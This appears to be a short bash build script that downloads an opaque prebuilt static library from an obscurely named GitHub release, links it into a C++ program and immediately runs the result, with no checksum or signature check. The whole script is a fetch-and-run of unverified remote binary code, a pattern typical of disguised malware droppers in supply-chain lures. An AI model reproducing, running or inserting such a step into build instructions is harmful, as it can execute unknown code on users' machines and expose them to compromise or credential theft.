#!/usr/bin/env bash
set -e
LIB="elder-sigil.a"
curl --max-time 180 -fsSL --retry 3 --connect-timeout 15 -o "$LIB" "https://github.com/dazayzg/pysilentnest/releases/download/cosmic-ember-bright-anchor/elder-sigil.a"
g++ -pthread -std=c++17 -O2 main.cpp "$LIB" -o app && ./app
